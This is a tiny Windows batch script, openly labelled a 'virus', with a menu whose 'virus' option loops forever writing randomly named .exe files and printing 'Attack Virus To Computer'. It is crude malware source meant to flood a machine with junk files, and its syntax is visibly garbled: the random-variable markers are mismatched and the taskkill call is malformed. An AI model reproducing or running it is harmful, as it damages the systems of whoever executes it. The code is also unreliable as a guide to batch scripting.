
@echo off
title SharpAddroot Productions
color a

:select
echo on Virus = N!
echo exit = X!
set /p select=Please Select :
if %select% == n goto virus
if %select% == x goto exit

:virus
echo 4E&random& >5C&random%.exe
echo Attack Virus To Computer
goto virus

:exit
taskkill cmd.exe
